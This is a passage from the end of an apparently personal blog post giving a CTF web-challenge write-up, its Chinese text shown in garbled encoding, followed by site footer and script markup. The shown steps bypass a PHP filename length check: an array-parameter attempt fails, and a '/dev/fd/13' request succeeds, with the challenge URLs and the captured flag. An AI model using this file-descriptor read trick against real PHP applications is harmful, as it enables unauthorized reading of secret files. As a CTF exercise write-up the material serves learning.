çªç„¶æƒ³åˆ°ç”¨æ•°ç»„ç»•è¿‡Â strlenÂ é•¿åº¦æ£€æŸ¥ï¼Œæ„é€ URLï¼ˆä¼ æ•°ç»„ç±»å‹çš„filenameï¼‰:http://019a26f9-c452-761b-ab4c-bdd99458e1c4.geek.ctfplus.cn/aa__%5E%5E.php?filename[]=/my_secret.txtï¼Œå‡ºç°æŠ¥é”™ï¼Œå½“å‰PHPç‰ˆæœ¬å¯¹strlen()çš„å‚æ•°ç±»å‹åšäº†ä¸¥æ ¼æ ¡éªŒï¼ˆä¸å…è®¸ä¼ æ•°ç»„ï¼‰ï¼Œæ‰€ä»¥æ•°ç»„ç»•è¿‡çš„æ–¹æ³•å¤±æ•ˆã€‚
6.æ€è€ƒ$flagå˜é‡çš„æ ¸å¿ƒé€»è¾‘ï¼Œå®é™…æ˜¯fopen("my_secret.txt", 'r')Â å¾—åˆ°çš„PHPèµ„æºå¥æŸ„ï¼Œå…¶æœ¬è´¨æ˜¯æ“ä½œç³»ç»Ÿä¸ºmy_secret.txtåˆ†é…çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆFDï¼‰çš„å°è£…ã€‚æ‰€ä»¥ç›´æ¥åˆ©ç”¨æ“ä½œç³»ç»Ÿçš„è¿›ç¨‹FDåˆ—è¡¨æ„é€ å‚æ•°è¯»å–flagï¼Œä¸”æ­¤æ³•æ»¡è¶³strlen<11çš„é™åˆ¶ã€‚æ„é€ URLï¼šhttp://019abae6-0385-75ee-a05e-21775d87bf24.geek.ctfplus.cn/aa__%5E%5E.php?filename=/dev/fd/13
7.è·å¾—flagï¼šSYC{019abae6036f70cfa2d53c5395fc4824}

</section>


    <footer class="article-footer">
    

    </footer>


    
</article>

    

    

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo="linye9999/linye9999.github.io"
        issue-term="pathname"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 linye
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.32.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
